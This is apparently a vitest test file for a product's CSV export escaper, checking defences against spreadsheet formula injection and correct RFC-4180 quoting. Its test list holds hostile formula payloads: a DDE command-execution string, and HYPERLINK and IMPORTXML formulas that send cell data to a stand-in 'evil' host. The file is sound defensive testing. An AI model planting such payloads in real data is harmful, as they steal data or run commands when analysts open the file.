// CSV export escaping.
//
// SPREADSHEET FORMULA INJECTION (CWE-1236). Excel, LibreOffice and Google
// Sheets treat a leading `=`, `+`, `-`, `@`, tab or carriage return as the
// start of a formula. RFC-4180 quoting does not help — the quotes are consumed
// by the CSV parser and the cell is still a formula.
//
// It matters in this product specifically because the exporter is not the
// author of the rows. They arrive from SaaS connector syncs (Stripe, Shopify,
// HubSpot, Salesforce), from datasets another tenant shared, and from
// warehouse queries. A cell reading =HYPERLINK("https://x/?d="&A1,"Open")
// exfiltrates the neighbouring cell when an analyst opens the file and clicks;
// Sheets runs =IMPORTXML(...) with no click at all.
//
// AND THERE WERE TWO ESCAPERS. bi_.$dashboardId.tsx carried its own inline
// copy which had drifted three ways: it did not escape the HEADER row, its
// test was /[",\n]/ so it missed a bare carriage return, and it had no formula
// guard either. That route now calls the shared writer.
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import { __csvEscape as esc } from "@/lib/exportData";

describe("neutralises values a spreadsheet would execute", () => {
  for (const payload of [
    "=1+1",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("https://evil/?d="&A1,"Open")',
    '=IMPORTXML(CONCAT("https://evil/?",A1),"//a")',
    "+1+1",
    "-1+1",
    "@SUM(A1)",
    "\t=1+1",
    "\r=1+1",
  ]) {
    it(`prefixes ${JSON.stringify(payload)}`, () => {
      const out = esc(payload);
      // The apostrophe must be the first character of the CELL — inside the
      // quotes when the value is quoted, not before them.
      const cell = out.startsWith('"') ? out.slice(1) : out;
      expect(cell.startsWith("'"), `not neutralised: ${out}`).toBe(true);
    });
  }
});

describe("does not corrupt values that merely look like formulas", () => {
  it("leaves negative and signed numbers alone", () => {
    // The whole reason for the numeric exemption: guarding these would put an
    // apostrophe in front of every negative figure in every export.
    for (const n of ["-5", "-5.25", "+3", "-1e6", "-0.5", "+.5", "0", "5"]) {
      expect(esc(n), n).toBe(n);
    }
  });

  it("leaves ordinary text alone", () => {
    for (const s of ["plain text", "a-b", "x@y.com", "2026-08-02"]) {
      expect(esc(s), s).toBe(s);
    }
  });
});

describe("keeps RFC-4180 quoting correct", () => {
  it("quotes commas, quotes, newlines and carriage returns", () => {
    expect(esc("a,b")).toBe('"a,b"');
    expect(esc('say "hi"')).toBe('"say ""hi"""');
    expect(esc("line\nbreak")).toBe('"line\nbreak"');
    // The inline copy's regex omitted \r, so a bare CR broke the row.
    expect(esc("line\rreturn")).toBe('"line\rreturn"');
  });

  it("renders null and undefined as empty, not as the word", () => {
    expect(esc(null)).toBe("");
    expect(esc(undefined)).toBe("");
  });

  it("quotes AND neutralises when a payload also needs quoting", () => {
    const out = esc('=HYPERLINK("https://evil/?d="&A1,"Open")');
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out.endsWith('"')).toBe(true);
  });
});

describe("there is one CSV writer", () => {
  it("the dashboard route does not carry its own escaper", () => {
    const route = readFileSync("src/routes/_authenticated/bi_.$dashboardId.tsx", "utf8");
    expect(route, "an inline CSV escaper is back").not.toMatch(/replace\(\/"\/g, '""'\)/);
    expect(route).toMatch(/downloadCsv\(/);
  });

  it("the shared writer is the only place the escape rule is written", () => {
    const lib = readFileSync("src/lib/exportData.ts", "utf8");
    expect(lib).toMatch(/FORMULA_LEAD/);
  });
});
